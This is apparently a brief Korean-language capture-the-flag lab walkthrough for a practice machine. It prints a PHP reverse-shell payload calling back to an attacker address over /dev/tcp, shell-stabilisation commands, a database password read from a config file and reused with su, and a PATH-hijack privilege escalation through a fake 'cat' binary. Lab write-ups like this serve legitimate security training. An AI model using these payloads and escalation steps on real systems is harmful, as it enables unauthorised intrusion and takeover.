reverse shell
#
`1. php 업로드`
```
<?php
  exec("/bin/bash -c 'bash -i &> /dev/tcp/10.10.14.217/1234 0<&1'")
?>
```
`2. 셸 안정화`
```
script /dev/null -c bash
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```
`3. 탐색(home, var 하위 디렉토리)`
```
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
`4. 얻은 정보로 권한 상승?`
```
su robert
M3g4C0rpUs3r!
``` 
```
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
```
find / -group bugtracker 2>/dev/null
```
`bugtracker`그룹에 접근
```
find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```
id를 몰라서 접근이 안된다.

![image](https://user-images.githubusercontent.com/61821641/149992123-52fab6e7-b05b-41ea-b696-72f866995ed3.png)

`절대 경로 대신 상대 경로를 사용하여 cat binary를 호출하는 것을 볼 수 있다. 악의적인 cat을 만들고 현재 작업 디렉토리를 포함하도록 경로를 수정하면 잘못된 구성을 악용할 수 있으며 권한을 루트로 높일 수 있다.`
```
export PATH=/tmp:$PATH
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
```
#
